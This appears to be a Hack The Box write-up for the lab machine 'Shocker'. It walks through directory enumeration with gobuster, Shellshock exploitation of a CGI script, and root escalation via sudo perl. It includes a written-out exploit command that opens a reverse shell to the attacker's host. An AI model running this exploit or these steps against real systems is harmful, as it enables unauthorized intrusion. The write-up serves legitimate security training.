---
title: Shocker Hackthebox Writeup
date: 2020-12-25 09:00:00 +0800
categories: [Hackthebox, Retired]
tags: [linux,cgi-bin,shellshock,gobuster,apache shellshock]     # TAG names should always be lowercase
image: /assets/img/shocker-hackthebox/shocker-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Shocker:~$


Column | Details
------------ | -------------
Name | Shocker
IP | 10.10.10.56
Points | 20
Os | Linux
Difficult | Easy
Creator | [mrb3n](https://www.hackthebox.eu/profile/2984)
Out on | 30th September 2017

# Summary:~$

* Discovering the new host and scanning for open ports.
* Using `gobuster` on port 80, for `directory search`, we got `/cgi-bin/` as one of the *Forbidden* directories.
* Using `gobuster` on `/cgi-bin/`, we got `user.sh`
* After searching on internet, we got `shellshock` exploit, which gave us `User Shell`.
* Used `pearl` for escalating privileges to become `Root`.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/shocker-hackthebox/nmap-port-80-1.png)

___
![](/assets/img/shocker-hackthebox/nmap-port-2222-1.png)

Basically `2 Ports` are open i.e. `80,2222`, Let's access `port 80` it first.

___
![](/assets/img/shocker-hackthebox/port-80-2.png)

Using `gobuster` for directory search, which gave us with `/cgi-bin/` as a directory but it's *Forbidden*.

**Command**: *gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.56/ -t 100*

___
![](/assets/img/shocker-hackthebox/gobuster-command-3.png)

Using `gobuster` on **http://10.10.10.56/cgi-bin/** to search for further files.

**Command**: *gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x html,php,sh*

where **-x** : *For extensions like html,php,sh etc.*

___
![](/assets/img/shocker-hackthebox/cgi-bin-gobuster-7.png)

and we got `/user.sh` as a file , accessing **http://10.10.10.56/cgi-bin/user.sh**

___
![](/assets/img/shocker-hackthebox/user-sh-page-8.png)

After that I googled about `Apache 2.4.18 cgi bin`, which showed me something related to **Shellshock Remote code injection**.

___
![](/assets/img/shocker-hackthebox/google-cgi-bin-5.png)

I check `searchsploit` for that and found this:

___
![](/assets/img/shocker-hackthebox/searchsploit-result-6.png)

Now making some changes in the python exploit by adding `/cgi-bin/user.sh` as one the directories/pages.

___
![](/assets/img/shocker-hackthebox/changing-exploit-9.png)

Running the exploit gave us the `User Shell`.

**Exploit Command**: *python exploit.py payload=reverse rhost=10.10.10.56 lhost=10.10.X.X lport 4444*

___
![](/assets/img/shocker-hackthebox/got-shell-10.png) 

For `Privilege Escalation`, I used the command `sudo -l` to check what permissions do we have.

___
![](/assets/img/shocker-hackthebox/sudo-l-privesc-12.png)

We can run `pearl` as administrator. Let's refer to [GTFObins](https://gtfobins.github.io/gtfobins/perl/#sudo) and search for peal.

___
![](/assets/img/shocker-hackthebox/sudo-perl-13.png)

Running the above mentioned command, we got `Root`.

___
![](/assets/img/shocker-hackthebox/got-root-14.png)